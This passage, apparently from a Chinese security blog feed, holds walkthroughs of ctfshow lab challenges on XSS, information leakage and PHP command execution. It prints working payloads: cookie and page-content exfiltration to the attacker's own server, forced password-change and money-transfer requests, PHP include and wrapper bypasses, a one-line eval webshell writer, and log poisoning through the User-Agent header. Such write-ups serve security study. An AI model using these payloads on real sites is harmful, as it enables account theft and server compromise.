class="hljs-string">&#x27;http://服务器IP/cookie.php?cookie=&#x27;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByClassName</span>(<span class="hljs-string">&#x27;laytable-cell-1-0-1&#x27;</span>)[<span class="hljs-number">1</span>].<span class="hljs-property">innerHTML</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus">window<span class="hljs-selector-class">.open</span>(<span class="hljs-string">&#x27;http://ip/&#x27;</span> + document<span class="hljs-selector-class">.getElementsByClassName</span>(<span class="hljs-string">&#x27;laytable-cell-1-0-1&#x27;</span>)<span class="hljs-selector-attr">[1]</span>.innerHTML) 这是一个调用 window<span class="hljs-selector-class">.open</span>() 函数的语句，用于打开新的浏览器窗口。<br><br><span class="hljs-string">&#x27;http://ip/&#x27;</span> 这是一个字符串，表示要打开的网页的 URL。它包括了协议（http:<span class="hljs-comment">//）、主机名（ip）和端口号（80），以及路径（后面的斜杠 /）。</span><br><br>document<span class="hljs-selector-class">.getElementsByClassName</span>(<span class="hljs-string">&#x27;laytable-cell-1-0-1&#x27;</span>)<span class="hljs-selector-attr">[1]</span><span class="hljs-selector-class">.innerHTML</span> 这是一系列 DOM 操作，用于获取网页中特定元素的内容。<br><br>document<span class="hljs-selector-class">.getElementsByClassName</span>(<span class="hljs-string">&#x27;laytable-cell-1-0-1&#x27;</span>) 是一个通过类名查找元素的方法。它查找具有类名<span class="hljs-string">&#x27;laytable-cell-1-0-1&#x27;</span> 的元素，通常这是一种针对表格单元格的选择。<br><br><span class="hljs-selector-attr">[1]</span> 表示从匹配的元素列表中选择第二个元素（JavaScript 中的数组索引从 <span class="hljs-number">0</span> 开始）。<br><br><span class="hljs-selector-class">.innerHTML</span> 用于获取选定元素的 HTML 内容，也就是在这个表格单元格中显示的文本或 HTML。<br><span class="hljs-number">1</span>、innerHTML:<br>　　从对象的起始位置到终止位置的全部内容,不包括Html标签。<br>innerText可替代innerHTML<br><span class="hljs-number">2</span>、outerHTML:<br>　　除了包含innerHTML的全部内容外, 还包含对象标签本身。<br></code></pre></td></tr></table></figure><p>其他方法：<a href="https://blog.csdn.net/Jayjay___/article/details/133375048">https://blog.csdn.net/Jayjay___/article/details/133375048</a></p><h2 id="web-330"><a href="#web-330" class="headerlink" title="web-330"></a>web-330</h2><p>这题的登录页面多了个修改密码的功能，这题的思路就是我们注入一个xss，让管理员触发自动修改他的密码，这样我们就能登录了</p><p>我们注册一个普通账号，然后再修改密码时抓包</p><p>可以看到修改密码文件路径为<code>/api/change.php?p=</code>而且这里是使用GET方法来发送数据</p><p><img src="/../image/web-xss-9.png"></p><p>所以我们构造payload，并在注册账号中注入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&#x27;http://127.0.0.1/api/change.php?p=2439&#x27;</span>;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>注意这里Ip是127.0.0.1就是本地，因为服务端就在管理员的本地<br></code></pre></td></tr></table></figure><p>之后登录账号admin，密码2439</p><p>得到flag</p><p><img src="/../image/web-xss-10.png"></p><p>这时候会出现一种情况，我们在管理员账号上一点击<code>用户管理</code>，立马跳转到api，来不及复制flag。这是因为我们的XSSpayload是一个用户账号，管理员每次访问<code>用户管理</code>都会解析它。</p><p>解决办法：立刻Ctrl+u查看源码或者抓包。</p><h2 id="web-331"><a href="#web-331" class="headerlink" title="web-331"></a>web-331</h2><p>修改密码从GET方法变成了POST方法，其他的都没变，将payload修改成post请求即可</p><p>jQuery 提供的 Ajax 方法，用于向服务器发送异步 HTTP 请求</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">$.<span class="hljs-title function_">ajax</span>(&#123;<span class="hljs-attr">url</span>:<span class="hljs-string">&#x27;http://127.0.0.1/api/change.php&#x27;</span>,<span class="hljs-attr">type</span>:<span class="hljs-string">&#x27;post&#x27;</span>,<span class="hljs-attr">data</span>:&#123;<span class="hljs-attr">p</span>:<span class="hljs-string">&#x27;2439&#x27;</span>&#125;&#125;)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>url：发送路径，type：发送类型，data：数据</p><h2 id="web-332"><a href="#web-332" class="headerlink" title="web-332"></a>web-332</h2><p>这题多了很多功能，比如转账，个人账户，购买flag，从题目来看需要我们有足够的钱才能购买flag</p><p>法一：</p><p>这道题它代码逻辑有问题，转账的不扣转账方的金额，所以可以一直向自己转账，转的金额不超过自己余额即可（这里可以使用python脚本来写）</p><p>方法二：</p><p>可以给admin转-10000，这样我们就会+10000（有点离谱）</p><p>方法三：</p><p>直接让admin转自己10000，和上题让admin自己改密码思路是一样的</p><p>使用burpsuite抓转账的请求包</p><p><img src="/../image/web-xss-11.png"></p><p><strong>发现转账的路径为<code>/api/amount.php</code>，并且使用POST方法来发送数据<code>u=mixbp&amp;a=5</code></strong></p><p><strong>构造payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;script&gt;$.<span class="hljs-title function_ invoke__">ajax</span>(&#123;<span class="hljs-attr">url</span>:<span class="hljs-string">&#x27;http://127.0.0.1/api/amount.php&#x27;</span>,<span class="hljs-attr">type</span>:<span class="hljs-string">&#x27;post&#x27;</span>,<span class="hljs-attr">data</span>:&#123;<span class="hljs-attr">u</span>:<span class="hljs-string">&#x27;mixbp&#x27;</span>,<span class="hljs-attr">a</span>:<span class="hljs-string">&#x27;10000&#x27;</span>&#125;&#125;)&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>在注册界面注入我们的payload，之后就能看到钱已经到账了</p><hr><p>同样的原理：</p><p>这题也可以在我们的服务器上新建一个js文件名为mixbp.js</p><p>写入代码</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-variable">$.</span>ajax(&#123;<br>  url: <span class="hljs-string">&quot;http://127.0.0.1/api/amount.php&quot;</span>,<br>  <span class="hljs-function"><span class="hljs-keyword">method</span>: &quot;<span class="hljs-title">POST</span>&quot;,</span><br><span class="hljs-function">  <span class="hljs-title">data</span>:</span>&#123;<br>    <span class="hljs-string">&#x27;u&#x27;</span>:<span class="hljs-string">&#x27;mixbp&#x27;</span>,<br>    <span class="hljs-string">&#x27;a&#x27;</span>:<span class="hljs-number">10000</span><br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>然后构造payload并在注册界面写入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">src=<span class="hljs-string">&quot;http://服务器ip/mixbp.js&quot;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="web-333"><a href="#web-333" class="headerlink" title="web-333"></a>web-333</h2><p>除了不能转别人-10000之外，其他两种方法都能用，这里用python脚本来写试试</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot;http://c7e62c4c-a965-48a5-9c7a-390114141304.challenge.ctf.show/api/amount.php&quot;</span><br>headers =&#123;<span class="hljs-string">&#x27;Cookie&#x27;</span>:<span class="hljs-string">&#x27;PHPSESSID=???&#x27;</span>&#125; #自己账号登陆后的sessionid<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">10000</span>):<br>    tmp=i*<span class="hljs-number">4</span><br>    <span class="hljs-keyword">data</span> = &#123;<br>        <span class="hljs-string">&#x27;u&#x27;</span>: <span class="hljs-string">&#x27;mixbp&#x27;</span>,<br>        <span class="hljs-string">&#x27;a&#x27;</span>: str(tmp)<br>    &#125;<br>    res=requests.post(url,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>,headers=headers)<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-信息搜集</title>
      <link href="/2025/02/23/ctfshow-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
      <url>/2025/02/23/ctfshow-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="web-信息搜集"><a href="#web-信息搜集" class="headerlink" title="web-信息搜集"></a>web-信息搜集</h1><h2 id="web-1（源码查看）"><a href="#web-1（源码查看）" class="headerlink" title="web-1（源码查看）"></a>web-1（源码查看）</h2><p>打开页面，显示where is flag？，这里直接右键查看源代码就能看到flag了</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-1.png"></p><hr><h2 id="web-2（源码查看）"><a href="#web-2（源码查看）" class="headerlink" title="web-2（源码查看）"></a>web-2（源码查看）</h2><p>打开页面显示无法查看源代码（F12和右键查看源代码被禁），这里可以使用ctrl+u快捷键查看源代码，或者在url头部添加 view-source:</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-2.png"></p><hr><h2 id="web-3（响应包信息查看）"><a href="#web-3（响应包信息查看）" class="headerlink" title="web-3（响应包信息查看）"></a>web-3（响应包信息查看）</h2><p>页面还是显示where is flag?，查看源代码也没发现flag，这里使用burpsuite抓包看看</p><p>把请求包放在重放器里然后发送，发现flag在响应中</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-3.png"></p><hr><h2 id="web-4（robots-txt）"><a href="#web-4（robots-txt）" class="headerlink" title="web-4（robots.txt）"></a>web-4（robots.txt）</h2><p>题目简介写了robots.txt可能泄露信息，所以直接访问robots.txt，显示flagishere.txt</p><p>再次访问这个文件即可拿到flag</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-4.png"></p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-5.png"></p><p>参考链接：<a href="https://blog.csdn.net/m0_51683653/article/details/127252676?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_utm_term~default-5-127252676-blog-7918528.235%5Ev43%5Epc_blog_bottom_relevance_base7&spm=1001.2101.3001.4242.4&utm_relevant_index=8">【每天学习一点新知识】robots.txt详解-CSDN博客</a></p><p><strong>什么是robots.txt?</strong></p><p> <strong>robots.txt是一个协议,我们可以把它理解为一个网站的”管家”,它会告诉搜索引擎哪些页面可以访问,哪些页面不能访问。也可以规定哪些搜索引擎可以访问我们的网站而哪些搜索引擎不能爬取我们网站的信息等等,是网站管理者指定的”君子协议”。</strong></p><p><strong>当一个搜索机器人（有的叫搜索蜘蛛）访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，那么搜索机器人就沿着链接抓取。</strong></p><p><strong>另外，robots.txt必须放置在一个站点的根目录下，而且文件名必须全部小写。</strong></p><hr><h2 id="web-5（phps源码泄露）"><a href="#web-5（phps源码泄露）" class="headerlink" title="web-5（phps源码泄露）"></a>web-5（phps源码泄露）</h2><p>题目简介提示phps源码泄露，所以直接访问index.phps，然后会弹出下载框，将index.phps下载下来用记事本打开发现flag</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-6.png"></p><hr><h2 id="web-6（压缩文件泄露）"><a href="#web-6（压缩文件泄露）" class="headerlink" title="web-6（压缩文件泄露）"></a>web-6（压缩文件泄露）</h2><p>用dirsearch扫一下目录发现一个<a href="http://www.zip文件,结合题目提示的压缩文件泄露,所以直接访问这个文件,然后会自动下载下来/">www.zip文件，结合题目提示的压缩文件泄露，所以直接访问这个文件，然后会自动下载下来</a></p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-7.png"></p><p>解压发现两个文件，打开fl00g.txt找到flag</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-8.png"></p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-9.png"></p><hr><h2 id="web-7（git代码泄露）"><a href="#web-7（git代码泄露）" class="headerlink" title="web-7（git代码泄露）"></a>web-7（git代码泄露）</h2><p>考察git代码泄露，直接访问url&#x2F;.git&#x2F;index.php</p><p>和上一关方法相同，使用dirsearch扫一下目录</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-10.png"></p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-11.png"></p><hr><h2 id="web-8（svn泄露）"><a href="#web-8（svn泄露）" class="headerlink" title="web-8（svn泄露）"></a>web-8（svn泄露）</h2><p>考察信息svn泄露,直接访问url&#x2F;.svn&#x2F;，一样用dirsearch扫一下，发现一个.svn文件，访问之后就是flag</p><hr><h2 id="web-9（vim缓存泄露）"><a href="#web-9（vim缓存泄露）" class="headerlink" title="web-9（vim缓存泄露）"></a>web-9（vim缓存泄露）</h2><p>考察vim缓存信息泄露，直接访问url&#x2F;index.php.swp 注：上面的信息泄露可以参考 <a href="https://blog.csdn.net/a597934448/article/details/105431367">https://blog.csdn.net/a597934448/article/details/105431367</a></p><p>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</p><p>以 index.php 为例：</p><p>第一次产生的交换文件名为 .index.php.swp</p><p>再次意外退出后，将会产生名为 .index.php.swo 的交换文件</p><p>第三次产生的交换文件则为 .index.php.swn</p><p>所以根据提示直接访问index.php.swp即可拿到flag</p><hr><h2 id="web-10（查看cookie信息）"><a href="#web-10（查看cookie信息）" class="headerlink" title="web-10（查看cookie信息）"></a>web-10（查看cookie信息）</h2><p>根据提示猜测flag在cookie里，直接F12查看cookie即可拿到flag，但是需要解码，或者使用burpsuite抓包，在请求头的cookie中也可拿到flag</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-12.png"></p><hr><h2 id="web-11（域名解析）"><a href="#web-11（域名解析）" class="headerlink" title="web-11（域名解析）"></a>web-11（域名解析）</h2><p>题目提示域名也可以隐藏信息。</p><p><strong>查询域名解析地址 基本格式：nslookup host [server]</strong></p><p><strong>查询域名的指定解析类型的解析记录 基本格式：nslookup -type&#x3D;type host [server]</strong></p><p><strong>查询全部 基本格式：nslookup -query&#x3D;any host [server]</strong></p><p><strong>编辑nslookup -query&#x3D;any flag.ctfshow.com</strong></p><p><strong>C:\Users\16032&gt;nslookup -query&#x3D;any flag.ctfshow.com 服务器: public-dns-a.baidu.com Address: 180.76.76.76 非权威应答: flag.ctfshow.com text &#x3D; “flag{just_seesee}”</strong></p><p>所以直接使用命令： nslookup -qt&#x3D;txt flag.ctfshow.com即可</p><p>也可直接使用域名解析网站直接解析ctfshow.com</p><hr><h2 id="web-12（网站信息泄露）"><a href="#web-12（网站信息泄露）" class="headerlink" title="web-12（网站信息泄露）"></a>web-12（网站信息泄露）</h2><p>打开发现是个网站，先查看robots.txt文件，就能得到用户名admin。</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-13.png"></p><p>用dirsearch扫出&#x2F;admin，访问发现是管理员登录页面。但是我们只有用户名，无法登录</p><p>在网页里看看，发现最下面有一行数字，猜测就是密码</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-14.png"></p><p>直接登录就能拿到flag了</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-15.png"></p><p>这里的意思是管理员密码有时也会在页面中吗？</p><hr><h2 id="web-13（网站信息泄露）"><a href="#web-13（网站信息泄露）" class="headerlink" title="web-13（网站信息泄露）"></a>web-13（网站信息泄露）</h2><p>打开又是一个网页，这里发现最下面有个document可以点击，点进去是一个pdf文件</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-16.png"></p><p>pdf内写了默认后台地址、默认用户名、默认密码</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-17.png"></p><p>我们将默认后台地址中的your-domain改成题目的地址，然后使用用户名和密码登录即可拿到flag</p><hr><h2 id="web-14（网站信息泄露）"><a href="#web-14（网站信息泄露）" class="headerlink" title="web-14（网站信息泄露）"></a>web-14（网站信息泄露）</h2><p>根据题目提示访问editor，这里用diresearch扫一遍也行。</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-18.png"></p><p>点击插入文件，里面有个文件空间，发现 居然是服务器中的文件（非本地），于是浏览一下目录 在var&#x2F;www&#x2F;html目录 中，存在 一个nothinghere有一个文件 fl000g.txt 直接访问这个fl000g.txt 即可获得flag!</p><p><strong>url访问&#x2F;nothinghere&#x2F;fl000g.txt即可获取flag</strong></p><h2 id="web-15（网站信息泄露）"><a href="#web-15（网站信息泄露）" class="headerlink" title="web-15（网站信息泄露）"></a>web-15（网站信息泄露）</h2><p>打开页面发现最下面有个邮箱号<code>1156631961@qq.com</code>，记下来，然后访问&#x2F;admin，发现是一个后台登录页面。猜测用户名是admin，但是不知道密码。</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-19.png"></p><p>点开忘记密码发现有个密保，问我们所在地是哪个城市，直接qq查找上面的邮箱中的qq号，可以查到个人简介所在地是西安。</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-20.png"></p><p>重置密码成功。</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-21.png"></p><p>登录后台即可拿到flag</p><hr><h2 id="web-16（探针泄露）"><a href="#web-16（探针泄露）" class="headerlink" title="web-16（探针泄露）"></a>web-16（探针泄露）</h2><p>题目提示探针，所以访问tz.php。</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-22.png"></p><p>然后点开phpinfo，ctrl+f查找flag，即可拿到flag</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-23.png"></p><p><a href="https://blog.csdn.net/weixin_43790779/article/details/108834213?ops_request_misc=%7B%22request_id%22:%22171310161416800185843688%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=171310161416800185843688&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-108834213-null-null.142%5Ev100%5Econtrol&utm_term=PHP%E6%8E%A2%E9%92%88&spm=1018.2226.3001.4187"><strong>php</strong>探针</a></p><hr><h2 id="web-17（sql文件备份泄露）"><a href="#web-17（sql文件备份泄露）" class="headerlink" title="web-17（sql文件备份泄露）"></a>web-17（sql文件备份泄露）</h2><p>题目提示sql文件备份，dirsearch扫一遍发现&#x2F;backup.sql直接访问自动下载下来</p><p>打开之后拿到flag</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-24.png"></p><hr><h2 id="web-18（js前端分析）"><a href="#web-18（js前端分析）" class="headerlink" title="web-18（js前端分析）"></a>web-18（js前端分析）</h2><p>打开之后发现是个小游戏，然后提示要玩到101分才给flag，发现难度不是给人玩的。</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-25.png"></p><p>查看源码发现一个js文件，点开，然后分析js代码。当score&gt;120时，且game_over这个参数为false时，即可赢，于是打开开发者模式中的console，直接赋值score&#x3D;130 game_over&#x3D;false 然后，执行游戏 的run() 即可得到 “你赢了</p><p>直接控制台改分数即可</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">score = <span class="hljs-number">101</span><br><span class="hljs-function"><span class="hljs-title">run</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-26.png"></p><p>显示“你赢了，去幺幺零点皮爱吃皮看看”，一看就是拼音</p><p>访问110.php即可拿到flag</p><hr><h2 id="web-19（前端密钥泄露）"><a href="#web-19（前端密钥泄露）" class="headerlink" title="web-19（前端密钥泄露）"></a>web-19（前端密钥泄露）</h2><p>打开后发现是个登录界面，题目提示密钥不要放在前端，所以我们查看下源代码，然后发现密钥真的在前端。</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-27.png"></p><p>分析前端代码，发现只要post传参值判定正确即可输出flag</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-28.png"></p><hr><h2 id="web-20（mdb文件泄露）"><a href="#web-20（mdb文件泄露）" class="headerlink" title="web-20（mdb文件泄露）"></a>web-20（mdb文件泄露）</h2><p>mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加&#x2F;db&#x2F;db.mdb 下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag flag{ctfshow_old_database}</p><p>然后会自动给我们下载下来，记事本打开crtl+f查找flag即可</p><p><img src="/../image/web-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-29.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> 信息搜集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-命令执行</title>
      <link href="/2025/02/17/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2025/02/17/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="web-命令执行"><a href="#web-命令执行" class="headerlink" title="web-命令执行"></a>web-命令执行</h1><h2 id="web-29（-模糊匹配）"><a href="#web-29（-模糊匹配）" class="headerlink" title="web-29（*模糊匹配）"></a>web-29（*模糊匹配）</h2><p><img src="/../image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-1.png"></p><p>发现过滤了flag关键字，这里使用*模糊匹配就行了</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat fla*&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web-30（passthru、-模糊匹配）"><a href="#web-30（passthru、-模糊匹配）" class="headerlink" title="web-30（passthru、*模糊匹配）"></a>web-30（passthru、*模糊匹配）</h2><p><img src="/../image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2.png"></p><p>又过滤了system和php关键字，我们把system换成passthru加上模糊匹配即可</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=passthru(<span class="hljs-string">&#x27;cat fla*&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web-31（tac、-09绕过空格过滤、双引号绕过单引号过滤）"><a href="#web-31（tac、-09绕过空格过滤、双引号绕过单引号过滤）" class="headerlink" title="web-31（tac、%09绕过空格过滤、双引号绕过单引号过滤）"></a>web-31（tac、%09绕过空格过滤、双引号绕过单引号过滤）</h2><p><img src="/../image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-3.png"></p><p>这里又把cat、单引号和空格过滤了，可以把cat换成tac然后用url编码%09绕过空格过滤，然后使用双引号闭合</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=passthru(<span class="hljs-string">&quot;tac%09fla*&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="web-32（文件包含、filter伪协议、变量覆盖）"><a href="#web-32（文件包含、filter伪协议、变量覆盖）" class="headerlink" title="web-32（文件包含、filter伪协议、变量覆盖）"></a>web-32（文件包含、filter伪协议、变量覆盖）</h2><p><img src="/../image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-4.png"></p><p>这题过滤了更多东西。这里可以通过文件包含（伪协议）和变量覆盖来写，因为include包含函数是可以包含变量的$_GET[1]不加括号是因为，include把$__GET[1]当做一个变量来看，变量的内容由1来确定，1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php是通过get请求传入的参数，内容是一个文件包含，以base64形式返回</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]<span class="hljs-string">?&gt;</span>&amp;<span class="hljs-number">1</span>=<span class="hljs-symbol">php:</span>/<span class="hljs-regexp">/filter/convert</span>.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h2 id="web-33（文件包含、data-伪协议）"><a href="#web-33（文件包含、data-伪协议）" class="headerlink" title="web-33（文件包含、data:&#x2F;&#x2F;伪协议）"></a>web-33（文件包含、data:&#x2F;&#x2F;伪协议）</h2><p><img src="/../image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-5.png"></p><p>和上一题差不多，但是可以用另一种方法，文件包含<strong>data:&#x2F;&#x2F;协议</strong></p><p>类似与php:&#x2F;&#x2F;input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。从而导致任意代码执行。</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?c=include$_GET[1]?&gt;&amp;1=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat flag.php&#x27;</span>);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><h2 id="web-34（文件包含、input伪协议）"><a href="#web-34（文件包含、input伪协议）" class="headerlink" title="web-34（文件包含、input伪协议）"></a>web-34（文件包含、input伪协议）</h2><p>和上一题一样，但是我们换一种方法，文件包含php:&#x2F;&#x2F;input伪协议来做</p><p>利用该方法可以直接写入php文件，比如url中输入?file&#x3D;php:&#x2F;&#x2F;input，然后使用burp抓包，在POST请求中写入php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]<span class="hljs-meta">?&gt;</span>&amp;<span class="hljs-number">1</span>=php:<span class="hljs-comment">//input</span><br><br>抓包在post请求中写入<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;mixbp&quot;])?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这样就会在服务器端自动生成我们的一句话木马文件，然后用蚁剑连接即可拿到flag</p><h2 id="web-35（同前几题）"><a href="#web-35（同前几题）" class="headerlink" title="web-35（同前几题）"></a>web-35（同前几题）</h2><p>和前几个题一样</p><h2 id="web-36（日志包含）"><a href="#web-36（日志包含）" class="headerlink" title="web-36（日志包含）"></a>web-36（日志包含）</h2><p>和前几个题相比多过滤了0-9，把GET方法中的参数改为a即可。</p><p><strong>使用日志包含也可以，用文件包含去包含nginx默认的access日志路径，然后访问该路径抓包，在UA头里写入一句话木马，然后用蚁剑连接即可</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[a]<span class="hljs-string">?&gt;</span>&amp;a=<span 